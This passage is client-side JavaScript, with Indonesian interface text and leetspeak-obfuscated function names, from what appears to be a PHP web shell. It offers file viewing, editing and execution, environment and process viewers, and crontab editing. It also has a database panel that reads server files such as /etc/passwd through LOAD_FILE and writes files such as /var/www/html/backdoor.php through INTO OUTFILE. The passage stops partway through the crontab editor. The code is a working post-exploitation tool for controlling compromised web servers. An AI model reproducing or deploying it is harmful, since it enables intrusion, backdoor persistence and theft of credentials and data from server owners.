            'php': 'application/x-httpd-php', 'js': 'text/javascript', 'css': 'text/css',
            'html': 'text/html', 'htm': 'text/html', 'xml': 'application/xml', 'svg': 'image/svg+xml',
            'json': 'application/json', 'md': 'text/x-markdown', 'sql': 'text/x-sql',
            'sh': 'text/x-sh', 'bash': 'text/x-sh',
            'c': 'text/x-csrc', 'cpp': 'text/x-c++src', 'h': 'text/x-c++src',
            'py': 'text/x-python', 'pl': 'text/x-perl', 'java': 'text/x-java',
            'log': 'text/plain', 'txt': 'text/plain', 'conf': 'text/plain', 'ini': 'text/plain', 'htaccess': 'text/plain'
        };

        const hljsLangs = {
            'php': 'php', 'js': 'javascript', 'css': 'css',
            'html': 'xml', 'htm': 'xml', 'xml': 'xml', 'svg': 'xml',
            'json': 'json', 'md': 'markdown', 'sql': 'sql',
            'sh': 'bash', 'bash': 'bash',
            'c': 'c', 'cpp': 'cpp', 'h': 'cpp',
            'py': 'python', 'pl': 'perl', 'java': 'java',
            'log': 'plaintext', 'txt': 'plaintext', 'conf': 'ini', 'ini': 'ini', 'htaccess': 'apache'
        };

        const executableExtensions = ['php', 'php3', 'php4', 'php5', 'phtml', 'html', 'htm', 'shtml', 'pl', 'py', 'asp', 'aspx', 'jsp', 'cgi'];
        const binaryExtensions = ['zip', 'rar', '7z', 'gz', 'tar', 'bz2', 'mp3', 'mp4', 'avi', 'mov', 'jpg', 'jpeg', 'png', 'gif', 'bmp', 'ico', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'exe', 'dll', 'bin'];

        if (cmModes[extension]) {
            cmMode = cmModes[extension];
        }
        if (hljsLangs[extension]) {
            hljsLang = hljsLangs[extension];
        }

        if (binaryExtensions.includes(extension)) {
            isNonEditable = true;
        }

        if (executableExtensions.includes(extension)) {
            isExecutable = true;
        }

        return { cmMode, hljsLang, isNonEditable, isExecutable };
    }

    async function v13w_f1l3_c0nt3nt(n4m3_enc) {
        const n4m3 = decodeURIComponent(n4m3_enc);
        const fileConfig = getFileEditorConfig(n4m3);

        if (fileConfig.isNonEditable) {
            Swal.fire({
                title: '<i class="fas fa-info-circle mr-2"></i> Info',
                text: `File dengan ekstensi '.${n4m3.split('.').pop()}' tidak dapat dilihat atau diedit sebagai teks.`,
                icon: 'info',
                showConfirmButton: true
            });
            return;
        }

        const r3s = await s3nd_r3qu3st('g3t_f1l3_c0nt3nt', { n4m3: n4m3 });
        if (r3s.status === 'success') {
            const c0nt3nt = atob(r3s.contentData);
            const highlightedCode = `<pre><code class="language-${fileConfig.hljsLang}">${htmlentities(c0nt3nt)}</code></pre>`;

            Swal.fire({
                title: `<i class="material-icons-outlined">visibility</i> View File: ${n4m3}`,
                html: `<div class="swal2-html-container">${highlightedCode}</div>`,
                icon: 'info',
                width: '90vw',
                customClass: {
                    container: 'swal2-no-padding-bottom'
                },
                showConfirmButton: true,
                didOpen: () => {
                    hljs.highlightAll();
                }
            });
        } else {
            Swal.fire({
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            });
        }
    }

    async function edit_f1l3_c0nt3nt(n4m3_enc) {
        const n4m3 = decodeURIComponent(n4m3_enc);
        const fileConfig = getFileEditorConfig(n4m3);

        if (fileConfig.isNonEditable) {
            Swal.fire({
                title: '<i class="fas fa-info-circle mr-2"></i> Info',
                text: `File dengan ekstensi '.${n4m3.split('.').pop()}' tidak dapat diedit sebagai teks.`,
                icon: 'info',
                showConfirmButton: true
            });
            return;
        }

        const r3s = await s3nd_r3qu3st('g3t_f1l3_c0nt3nt', { n4m3: n4m3 });

        if (r3s.status === 'success') {
            const old_content = atob(r3s.contentData);
            
            const { value: n3w_c0nt3nt_wrapper, dismiss } = await Swal.fire({
                title: `<i class="material-icons-outlined">edit</i> Edit File: ${n4m3}`,
                html: '<textarea id="codemirror-editor" style="width:100%; height:400px;"></textarea>',
                showCancelButton: true,
                confirmButtonText: 'Save',
                cancelButtonText: 'Batal',
                width: '90vw',
                didOpen: () => {
                    const textArea = Swal.getPopup().querySelector('#codemirror-editor');
                    const editor = CodeMirror.fromTextArea(textArea, {
                        lineNumbers: true,
                        mode: fileConfig.cmMode,
                        theme: 'dracula',
                        indentUnit: 4,
                        indentWithTabs: true,
                        matchBrackets: true,
                        autofocus: true
                    });
                    editor.setValue(old_content);
                    Swal.getPopup().editorInstance = editor;
                },
                preConfirm: () => {
                    const editor = Swal.getPopup().editorInstance;
                    return editor.getValue();
                }
            });
            if (dismiss) return;

            if (n3w_c0nt3nt_wrapper !== undefined && n3w_c0nt3nt_wrapper !== old_content) {
                const r3s = await s3nd_r3qu3st('s4v3_f1l3_c0nt3nt', { n4m3: n4m3, c0nt3nt: btoa(n3w_c0nt3nt_wrapper) });
                Swal.fire(r3s.status === 'success' ? {
                    title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                    text: r3s.m3ss4g3,
                    icon: 'success',
                    showConfirmButton: true
                } : {
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                });
            } else if (n3w_c0nt3nt_wrapper === old_content) {
                Swal.fire({
                    title: 'Info', 
                    text: 'Tidak ada perubahan yang disimpan.', 
                    icon: 'info',
                    showConfirmButton: true
                });
            }
        } else {
            Swal.fire({
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            });
        }
    }

    function run_file(n4m3_enc) {
        const n4m3 = decodeURIComponent(n4m3_enc);
        let baseUrl = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
        let fileToRunUrl = baseUrl + n4m3;
        window.open(fileToRunUrl, '_blank');
    }

    async function sh0w_php_1nf0() {
        const r3s = await s3nd_r3qu3st('g3t_php_1nf0', {});
        if (r3s.status === 'success') {
            const php_info_html = atob(r3s.phpInfoContent);
            Swal.fire({
                title: '<i class="fab fa-php mr-2"></i> PHP Info',
                html: `<iframe srcdoc="${htmlentities(php_info_html)}" style="width:100%; height:500px; border:none; background-color: var(--swal-html-container-bg); color: var(--swal-html-container-text);"></iframe>`,
                width: '90vw',
                showConfirmButton: true,
                customClass: {
                    container: 'swal2-no-padding-bottom'
                }
            });
        } else {
            Swal.fire({
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            });
        }
    }

    async function sh0w_db_m4n4g3r_d1al0g() {
        const { value: formValues, dismiss } = await Swal.fire({
            title: '<i class="fas fa-database mr-2"></i> Database Connection',
            html:
                `<input id="swal-db-host" class="swal2-input" placeholder="Host (e.g., localhost)" value="localhost">` +
                `<input id="swal-db-user" class="swal2-input" placeholder="User">` +
                `<input id="swal-db-pass" type="password" class="swal2-input" placeholder="Password">` +
                `<input id="swal-db-name" class="swal2-input" placeholder="Database Name">`,
            focusConfirm: false,
            showCancelButton: true,
            confirmButtonText: 'Connect',
            preConfirm: () => {
                const host = Swal.getPopup().querySelector('#swal-db-host').value;
                const user = Swal.getPopup().querySelector('#swal-db-user').value;
                const pass = Swal.getPopup().querySelector('#swal-db-pass').value;
                const db = Swal.getPopup().querySelector('#swal-db-name').value;
                if (!host || !user || !db) {
                    Swal.showValidationMessage(`Host, User, dan Database Name tidak boleh kosong.`);
                    return false;
                }
                return { host: host, user: user, pass: pass, db: db };
            }
        });
        if (dismiss) return;

        if (formValues) {
            // Store DB credentials for subsequent actions in this session
            Swal.getPopup()._dbCreds = formValues; 
            sh0w_db_m4n4g3r_actions(formValues);
        }
    }

    async function sh0w_db_m4n4g3r_actions(db_creds) {
        const { value: action_choice, dismiss } = await Swal.fire({
            title: `<i class="fas fa-database mr-2"></i> Connected to ${db_creds.db}`,
            text: 'Pilih aksi database:',
            input: 'radio',
            inputOptions: {
                'list_tables': 'Daftar Tabel',
                'run_query': 'Jalankan Query SQL',
                'db_export_import': 'Import/Export Database',
                'db_schema_viewer': 'Lihat Skema Tabel',
                'db_file_rw': 'File Read/Write via SQL'
            },
            inputValue: 'list_tables',
            inputValidator: (value) => {
                if (!value) {
                    return 'Anda harus memilih aksi!';
                }
            },
            showCancelButton: true,
            confirmButtonText: 'Pilih',
            cancelButtonText: 'Batal'
        });
        if (dismiss) return;

        if (action_choice === 'list_tables') {
            const r3s = await s3nd_r3qu3st('db_m4n4g3r_list_tables', db_creds);
            if (r3s.status === 'success') {
                let tables_html = '<h3>Tabel dalam database:</h3>';
                if (r3s.tables && r3s.tables.length > 0) {
                    tables_html += '<ul class="list-disc list-inside" style="padding: 10px 20px;">';
                    r3s.tables.forEach(table => {
                        tables_html += `<li>${htmlentities(table)}</li>`;
                    });
                    tables_html += '</ul>';
                } else {
                    tables_html += '<p style="color:#888;">Tidak ada tabel ditemukan.</p>';
                }

                Swal.fire({
                    title: '<i class="material-icons-outlined">table_chart</i> Daftar Tabel',
                    html: `<div class="swal2-html-container">${tables_html}</div>`,
                    icon: 'info',
                    width: '80vw',
                    showConfirmButton: true
                });
            } else {
                Swal.fire({
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                });
            }
        } else if (action_choice === 'run_query') {
            const { value: sql_query, dismiss: dismissQuery } = await Swal.fire({
                title: '<i class="material-icons-outlined">code</i> Jalankan Query SQL',
                input: 'textarea',
                inputPlaceholder: 'Masukkan query SQL Anda (misal: SELECT * FROM users LIMIT 10;)',
                showCancelButton: true,
                confirmButtonText: 'Execute Query',
                cancelButtonText: 'Batal',
                inputValidator: (value) => {
                    if (!value) {
                        return 'Query tidak boleh kosong!';
                    }
                },
                width: '90vw'
            });
            if (dismissQuery) return;

            if (sql_query) {
                const query_data = { ...db_creds, query: sql_query };
                const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', query_data);

                if (r3s.status === 'success') {
                    let result_html = '';
                    if (r3s.queryResult && r3s.queryResult.length > 0) {
                        result_html += '<table style="width:100%; border-collapse:collapse; margin: 15px 0; background:white; box-shadow:0 1px 3px rgba(0,0,0,0.05); border-radius:6px; overflow:hidden;">';
                        result_html += '<thead><tr style="background:#f4f6f8; color:#333;">';
                        r3s.queryHeaders.forEach(header => {
                            result_html += `<th style="padding:10px 12px; border:1px solid #eee; text-align:left;">${htmlentities(header)}</th>`;
                        });
                        result_html += '</tr></thead><tbody>';
                        r3s.queryResult.forEach(row => {
                            result_html += '<tr style="background:white;">';
                            r3s.queryHeaders.forEach(header => {
                                result_html += `<td style="padding:10px 12px; border:1px solid #eee; text-align:left;">${htmlentities(row[header])}</td>`;
                            });
                            result_html += '</tr>';
                        });
                        result_html += '</tbody></table>';
                    } else {
                        result_html = `<p style="color:#888;">Query berhasil, tidak ada baris yang dikembalikan.</p>`;
                    }

                    Swal.fire({
                        title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Query Result',
                        html: `<div class="swal2-html-container">${result_html}</div><p style="color:#888;">${htmlentities(r3s.m3ss4g3)}</p>`,
                        icon: 'info',
                        width: '90vw',
                        showConfirmButton: true
                    });
                } else {
                    Swal.fire({
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Query Gagal!',
                        text: r3s.m3ss4g3,
                        icon: 'error',
                        showConfirmButton: true
                    });
                }
            }
        } else if (action_choice === 'db_export_import') {
            const { value: import_export_choice, dismiss: dismissIE } = await Swal.fire({
                title: '<i class="material-icons-outlined">import_export</i> Import/Export Database',
                input: 'radio',
                inputOptions: {
                    'export': 'Export Database/Table',
                    'import': 'Import SQL File'
                },
                inputValue: 'export',
                showCancelButton: true,
                confirmButtonText: 'Next',
                cancelButtonText: 'Batal'
            });
            if (dismissIE) return;

            if (import_export_choice === 'export') {
                const { value: table_name, dismiss: dismissTableName } = await Swal.fire({
                    title: '<i class="material-icons-outlined">cloud_download</i> Export Table',
                    input: 'text',
                    inputPlaceholder: 'Nama tabel (kosong untuk seluruh DB)',
                    showCancelButton: true,
                    confirmButtonText: 'Export',
                    cancelButtonText: 'Batal'
                });
                if (dismissTableName) return;
                
                Swal.fire({
                    title: '<i class="fas fa-info-circle mr-2"></i> Fitur Export',
                    text: 'Fitur ekspor database/tabel yang sebenarnya memerlukan akses ke perintah `mysqldump` di server, yang mungkin tidak tersedia atau memerlukan hak istimewa. Untuk demo, ini akan mencoba mengambil data menggunakan SELECT.',
                    icon: 'info',
                    showConfirmButton: true
                });
                const query_for_export = table_name ? `SELECT * FROM ${table_name}` : `SHOW TABLES`; 
                const r3s_export = await s3nd_r3qu3st('db_m4n4g3r_query', { ...db_creds, query: query_for_export });
                
                if(r3s_export.status === 'success' && r3s_export.queryResult && r3s_export.queryResult.length > 0) {
                    let export_data_str = `/* Data from ${table_name || 'selected tables'} */\n\n`;
                    r3s_export.queryResult.forEach(row => {
                        export_data_str += `INSERT INTO \`${table_name || 'your_table'}\` VALUES ('${Object.values(row).join("','")}');\n`; 
                    });

                    const { value: copy_confirm, dismiss: dismissDownload } = await Swal.fire({
                        title: '<i class="material-icons-outlined">file_download</i> Konten SQL Export',
                        html: `<textarea readonly class="swal2-textarea" style="height: 200px;">${htmlentities(export_data_str)}</textarea><br><small style="color:#888;">Salin konten ini. Ekspor penuh memerlukan hak akses server.</small>`,
                        showCancelButton: true,
                        confirmButtonText: 'Salin ke Clipboard',
                        cancelButtonText: 'Batal'
                    });

                    if (copy_confirm) {
                         // Copy to clipboard
                        const textArea = Swal.getPopup().querySelector('textarea');
                        textArea.select();
                        document.execCommand('copy');
                        Swal.fire({
                            title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                            text: 'Konten SQL disalin ke clipboard!',
                            icon: 'success',
                            showConfirmButton: true
                        });
                    }
                } else {
                    Swal.fire({
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Export Gagal!',
                        text: r3s_export.m3ss4g3 || 'Tidak dapat mengekspor data atau tidak ada hasil.',
                        icon: 'error',
                        showConfirmButton: true
                    });
                }
            } else if (import_export_choice === 'import') {
                const { value: sql_content, dismiss: dismissSqlContent } = await Swal.fire({
                    title: '<i class="material-icons-outlined">cloud_upload</i> Import SQL',
                    input: 'textarea',
                    inputPlaceholder: 'Tempelkan konten SQL di sini...',
                    showCancelButton: true,
                    confirmButtonText: 'Import',
                    cancelButtonText: 'Batal',
                    width: '90vw'
                });
                if (dismissSqlContent) return;

                if (sql_content) {
                    const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...db_creds, query: sql_content });
                    Swal.fire(r3s.status === 'success' ? {
                        title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                        text: 'Import SQL berhasil: ' + r3s.m3ss4g3,
                        icon: 'success',
                        showConfirmButton: true
                    } : {
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                        text: 'Import SQL gagal: ' + r3s.m3ss4g3,
                        icon: 'error',
                        showConfirmButton: true
                    });
                }
            }
        } else if (action_choice === 'db_schema_viewer') {
            const { value: table_name, dismiss: dismissTableName } = await Swal.fire({
                title: '<i class="material-icons-outlined">view_list</i> Lihat Skema Tabel',
                input: 'text',
                inputPlaceholder: 'Nama Tabel (misal: users)',
                showCancelButton: true,
                confirmButtonText: 'Lihat Skema',
                cancelButtonText: 'Batal',
                inputValidator: (value) => {
                    if (!value) return 'Nama tabel tidak boleh kosong!';
                }
            });
            if (dismissTableName) return;

            if (table_name) {
                const query = `SELECT COLUMN_NAME, DATA_TYPE, COLUMN_TYPE, IS_NULLABLE, COLUMN_KEY, COLUMN_DEFAULT, EXTRA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '${db_creds.db}' AND TABLE_NAME = '${table_name}'`;
                const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...db_creds, query: query });
                
                if (r3s.status === 'success') {
                    let schema_html = '';
                    if (r3s.queryResult && r3s.queryResult.length > 0) {
                        schema_html += '<table style="width:100%; border-collapse:collapse; margin: 15px 0; background:white; box-shadow:0 1px 3px rgba(0,0,0,0.05); border-radius:6px; overflow:hidden;">';
                        schema_html += '<thead><tr style="background:#f4f6f8; color:#333;">';
                        r3s.queryHeaders.forEach(header => {
                            schema_html += `<th style="padding:10px 12px; border:1px solid #eee; text-align:left;">${htmlentities(header)}</th>`;
                        });
                        schema_html += '</tr></thead><tbody>';
                        r3s.queryResult.forEach(row => {
                            schema_html += '<tr style="background:white;">';
                            r3s.queryHeaders.forEach(header => {
                                schema_html += `<td style="padding:10px 12px; border:1px solid #eee; text-align:left;">${htmlentities(row[header])}</td>`;
                            });
                            schema_html += '</tr>';
                        });
                        schema_html += '</tbody></table>';
                    } else {
                        schema_html = `<p style="color:#888;">Skema tabel tidak ditemukan atau tabel kosong.</p>`;
                    }
                    Swal.fire({
                        title: `<i class="material-icons-outlined">view_list</i> Skema Tabel: ${table_name}`,
                        html: `<div class="swal2-html-container">${schema_html}</div>`,
                        icon: 'info',
                        width: '90vw',
                        showConfirmButton: true
                    });
                } else {
                    Swal.fire({
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                        text: r3s.m3ss4g3,
                        icon: 'error',
                        showConfirmButton: true
                    });
                }
            }
        } else if (action_choice === 'db_file_rw') {
            const { value: rw_option, dismiss: dismissRW } = await Swal.fire({
                title: '<i class="material-icons-outlined">swap_horiz</i> File Read/Write via SQL',
                input: 'radio',
                inputOptions: {
                    'read_file': 'Baca File dari Server',
                    'write_file': 'Tulis File ke Server'
                },
                inputValue: 'read_file',
                showCancelButton: true,
                confirmButtonText: 'Next',
                cancelButtonText: 'Batal'
            });
            if (dismissRW) return;

            if (rw_option === 'read_file') {
                const { value: file_path, dismiss: dismissPath } = await Swal.fire({
                    title: '<i class="material-icons-outlined">file_open</i> Baca File via SQL',
                    input: 'text',
                    inputPlaceholder: 'Path file di server (misal: /etc/passwd)',
                    showCancelButton: true,
                    confirmButtonText: 'Baca',
                    cancelButtonText: 'Batal'
                });
                if (dismissPath) return;

                if (file_path) {
                    const query = `SELECT LOAD_FILE('${file_path.replace(/'/g, "''")}') AS file_content`;
                    const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...db_creds, query: query });
                    if (r3s.status === 'success' && r3s.queryResult && r3s.queryResult.length > 0) {
                        const file_content = r3s.queryResult[0].file_content;
                        Swal.fire({
                            title: `<i class="material-icons-outlined">visibility</i> Konten File: ${file_path}`,
                            html: `<pre class="swal2-html-container">${htmlentities(file_content)}</pre>`,
                            icon: 'info',
                            width: '90vw',
                            showConfirmButton: true
                        });
                    } else {
                        Swal.fire({
                            title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal Membaca File!',
                            text: r3s.m3ss4g3 || 'Tidak dapat membaca file atau hak istimewa FILE tidak tersedia.',
                            icon: 'error',
                            showConfirmButton: true
                        });
                    }
                }
            } else if (rw_option === 'write_file') {
                const { value: file_path, dismiss: dismissPath } = await Swal.fire({
                    title: '<i class="material-icons-outlined">save</i> Tulis File via SQL',
                    input: 'text',
                    inputPlaceholder: 'Path file untuk ditulis (misal: /var/www/html/backdoor.php)',
                    showCancelButton: true,
                    confirmButtonText: 'Next',
                    cancelButtonText: 'Batal'
                });
                if (dismissPath) return;

                if (file_path) {
                    const { value: file_content, dismiss: dismissContent } = await Swal.fire({
                        title: '<i class="material-icons-outlined">edit</i> Konten File untuk Ditulis',
                        input: 'textarea',
                        inputPlaceholder: 'Masukkan konten file...',
                        showCancelButton: true,
                        confirmButtonText: 'Tulis',
                        cancelButtonText: 'Batal'
                    });
                    if (dismissContent) return;

                    if (file_content !== undefined) {
                        const query = `SELECT '${file_content.replace(/'/g, "''")}' INTO OUTFILE '${file_path.replace(/'/g, "''")}'`;
                        const r3s = await s3nd_r3qu3st('db_m4n4g3r_query', { ...db_creds, query: query });
                        Swal.fire(r3s.status === 'success' ? {
                            title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                            text: `File berhasil ditulis ke: ${file_path}`,
                            icon: 'success',
                            showConfirmButton: true
                        } : {
                            title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                            text: r3s.m3ss4g3 || 'Gagal menulis file atau hak istimewa FILE tidak tersedia.',
                            icon: 'error',
                            showConfirmButton: true
                        });
                    }
                }
            }
        }
    }

    async function sh0w_file_content_search_d1al0g() {
        const { value: search_params, dismiss } = await Swal.fire({
            title: '<i class="material-icons-outlined">search</i> Cari Konten File',
            html:
                `<input id="swal-search-string" class="swal2-input" placeholder="String atau Regex yang dicari">` +
                `<input id="swal-search-path" class="swal2-input" placeholder="Path direktori (kosong untuk saat ini)" value="${curr_D1r_JS}">` +
                `<label style="display:flex; align-items:center; margin-top:10px;"><input type="checkbox" id="swal-search-recursive" class="form-checkbox h-4 w-4 text-blue-600 rounded mr-2"> Cari Rekursif</label>` +
                `<label style="display:flex; align-items:center; margin-top:5px;"><input type="checkbox" id="swal-search-regex" class="form-checkbox h-4 w-4 text-blue-600 rounded mr-2"> Gunakan Regex</label>`,
            focusConfirm: false,
            showCancelButton: true,
            confirmButtonText: 'Cari',
            cancelButtonText: 'Batal',
            preConfirm: () => {
                const search_string = Swal.getPopup().querySelector('#swal-search-string').value;
                const search_path = Swal.getPopup().querySelector('#swal-search-path').value;
                const recursive = Swal.getPopup().querySelector('#swal-search-recursive').checked;
                const regex = Swal.getPopup().querySelector('#swal-search-regex').checked;
                if (!search_string) {
                    Swal.showValidationMessage(`String pencarian tidak boleh kosong!`);
                    return false;
                }
                return { search_string, search_path, recursive, regex };
            }
        });
        if (dismiss) return;

        if (search_params) {
            const r3s = await s3nd_r3qu3st('search_file_content', search_params);
            if (r3s.status === 'success') {
                Swal.fire({
                    title: '<i class="material-icons-outlined">search</i> Hasil Pencarian',
                    html: `<pre class="swal2-html-container">${htmlentities(r3s.commandOutput || 'Tidak ada hasil.')}</pre>`,
                    icon: 'info',
                    width: '90vw',
                    showConfirmButton: true
                });
            } else {
                Swal.fire({
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                });
            }
        }
    }

    async function sh0w_copy_move_d1al0g() {
        const { value: operation_type, dismiss: dismissOpType } = await Swal.fire({
            title: '<i class="material-icons-outlined">content_copy</i> Salin/Pindah File/Folder',
            input: 'radio',
            inputOptions: {
                'copy': 'Salin (Copy)',
                'move': 'Pindah (Move)'
            },
            inputValue: 'copy',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal'
        });
        if (dismissOpType) return;

        if (operation_type) {
            const { value: item_name, dismiss: dismissItemName } = await Swal.fire({
                title: `Nama File/Folder untuk ${operation_type === 'copy' ? 'Disalin' : 'Dipindah'}`,
                input: 'text',
                inputPlaceholder: 'Nama file/folder (contoh: my_file.txt atau my_folder)',
                showCancelButton: true,
                confirmButtonText: 'Next',
                cancelButtonText: 'Batal',
                inputValidator: (value) => {
                    if (!value) return 'Nama tidak boleh kosong!';
                }
            });
            if (dismissItemName) return;

            if (item_name) {
                const { value: destination_path, dismiss: dismissDestPath } = await Swal.fire({
                    title: `Direktori Tujuan untuk ${operation_type === 'copy' ? 'Salin' : 'Pindah'}`,
                    input: 'text',
                    inputPlaceholder: 'Path tujuan (contoh: /var/www/html/backup)',
                    inputValue: curr_D1r_JS,
                    showCancelButton: true,
                    confirmButtonText: operation_type === 'copy' ? 'Salin' : 'Pindah',
                    cancelButtonText: 'Batal',
                    inputValidator: (value) => {
                        if (!value) return 'Direktori tujuan tidak boleh kosong!';
                    }
                });
                if (dismissDestPath) return;

                if (destination_path) {
                    const r3s = await s3nd_r3qu3st('copy_move_item', { 
                        source_name: item_name, 
                        destination_path: destination_path, 
                        operation_type: operation_type 
                    });
                    Swal.fire(r3s.status === 'success' ? {
                        title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                        text: r3s.m3ss4g3,
                        icon: 'success',
                        showConfirmButton: true
                    } : {
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                        text: r3s.m3ss4g3,
                        icon: 'error',
                        showConfirmButton: true
                    }).then(() => {
                        if (r3s.status === 'success') location.reload();
                    });
                }
            }
        }
    }

    async function sh0w_create_archive_d1al0g() {
        const { value: archive_type, dismiss: dismissArchiveType } = await Swal.fire({
            title: '<i class="material-icons-outlined">folder_zip</i> Buat Arsip',
            text: 'Pilih format arsip:',
            input: 'radio',
            inputOptions: {
                'zip': 'ZIP (.zip)',
                'tar.gz': 'Tar GZ (.tar.gz)'
            },
            inputValue: 'zip',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal'
        });
        if (dismissArchiveType) return;

        if (archive_type) {
            const { value: archive_name, dismiss: dismissArchiveName } = await Swal.fire({
                title: `Nama File Arsip (.${archive_type})`,
                input: 'text',
                inputPlaceholder: `Nama arsip (misal: backup.${archive_type})`,
                inputValue: `archive.${archive_type}`,
                showCancelButton: true,
                confirmButtonText: 'Next',
                cancelButtonText: 'Batal',
                inputValidator: (value) => {
                    if (!value) return 'Nama arsip tidak boleh kosong!';
                }
            });
            if (dismissArchiveName) return;

            if (archive_name) {
                const { value: items_to_archive_str, dismiss: dismissItems } = await Swal.fire({
                    title: `<i class="material-icons-outlined">content_copy</i> Item untuk Diarsipkan`,
                    input: 'textarea',
                    inputPlaceholder: 'Daftar nama file/folder, pisahkan dengan koma atau baris baru (contoh: file1.txt, folder_a)',
                    showCancelButton: true,
                    confirmButtonText: 'Buat Arsip',
                    cancelButtonText: 'Batal'
                });
                if (dismissItems) return;

                if (items_to_archive_str) {
                    const items_to_archive = items_to_archive_str.split(/[\n,]/).map(item => item.trim()).filter(item => item !== '');
                    const r3s = await s3nd_r3qu3st('create_archive', { 
                        archive_name: archive_name, 
                        archive_type: archive_type,
                        items: items_to_archive
                    });
                    Swal.fire(r3s.status === 'success' ? {
                        title: '<i class="fas fa-check-circle perm-color-green mr-2"></i> Berhasil!',
                        text: r3s.m3ss4g3,
                        icon: 'success',
                        showConfirmButton: true
                    } : {
                        title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                        text: r3s.m3ss4g3,
                        icon: 'error',
                        showConfirmButton: true
                    }).then(() => {
                        if (r3s.status === 'success') location.reload();
                    });
                }
            }
        }
    }

    async function sh0w_process_manager_d1al0g() {
        const r3s = await s3nd_r3qu3st('list_processes', {});
        if (r3s.status === 'success') {
            Swal.fire({
                title: '<i class="material-icons-outlined">settings_applications</i> Process List',
                html: `<pre class="swal2-html-container">${htmlentities(r3s.commandOutput || 'Tidak ada proses berjalan.')}</pre>`,
                icon: 'info',
                width: '90vw',
                showConfirmButton: true
            });
        } else {
            Swal.fire({
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            });
        }
    }

    async function sh0w_env_viewer_d1al0g() {
        const r3s = await s3nd_r3qu3st('view_environment', {});
        if (r3s.status === 'success') {
            let env_html = '<h3>Variabel Lingkungan:</h3><table style="width:100%; border-collapse:collapse; margin: 15px 0;"><thead><tr style="background:#f4f6f8; color:#333;"><th>Variable</th><th>Value</th></tr></thead><tbody>';
            for (const key in r3s.env_vars) {
                env_html += `<tr><td>${htmlentities(key)}</td><td>${htmlentities(r3s.env_vars[key])}</td></tr>`;
            }
            env_html += '</tbody></table>';

            Swal.fire({
                title: '<i class="material-icons-outlined">settings_ethernet</i> Environment Viewer',
                html: `<div class="swal2-html-container">${env_html}</div>`,
                icon: 'info',
                width: '90vw',
                showConfirmButton: true
            });
        } else {
            Swal.fire({
                title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                text: r3s.m3ss4g3,
                icon: 'error',
                showConfirmButton: true
            });
        }
    }

    async function sh0w_crontab_manager_d1al0g() {
        const { value: action_choice, dismiss } = await Swal.fire({
            title: '<i class="material-icons-outlined">schedule</i> Crontab Manager',
            text: 'Pilih aksi:',
            input: 'radio',
            inputOptions: {
                'view': 'Lihat Crontab',
                'edit': 'Edit Crontab'
            },
            inputValue: 'view',
            showCancelButton: true,
            confirmButtonText: 'Next',
            cancelButtonText: 'Batal'
        });
        if (dismiss) return;

        if (action_choice === 'view') {
            const r3s = await s3nd_r3qu3st('get_crontab', {});
            if (r3s.status === 'success') {
                Swal.fire({
                    title: '<i class="material-icons-outlined">schedule</i> Crontab Content',
                    html: `<pre class="swal2-html-container">${htmlentities(r3s.commandOutput || 'Tidak ada entri crontab.')}</pre>`,
                    icon: 'info',
                    width: '90vw',
                    showConfirmButton: true
                });
            } else {
                Swal.fire({
                    title: '<i class="fas fa-times-circle perm-color-red mr-2"></i> Gagal!',
                    text: r3s.m3ss4g3,
                    icon: 'error',
                    showConfirmButton: true
                });
            }
        } else if (action_choice === 'edit') {
            const r3s_get = await s3nd_r3qu3st('get_crontab', {}); // Get current crontab to pre-fill
            let current_crontab = (r3s_get.status === 'success') ? r3s_get.commandOutput : '';

            const { value: new_crontab_content, dismiss: dismissEdit } = await Swal.fire({
                title: '<i class="material-icons-outlined">edit</i> Edit Crontab',
                html: `<textarea id="crontab-editor" class="swal2-textarea" style="height: 300px;">${htmlentities(current_crontab)}</textarea><br><small style="color:#888;">Hati-hati saat mengedit crontab!</small>`,
                showCancelButton: true,
                confirmButtonText: 'Simpan',
                cancelButtonText: 'Batal',
                width: '90vw',
                didOpen: () => {
                    const textArea = Swal.getPopup().querySelector('#crontab-editor');
                },
                preConfirm: () => {
                    return Swal.getPopup().querySelector('#crontab-editor').value;
                }
            });
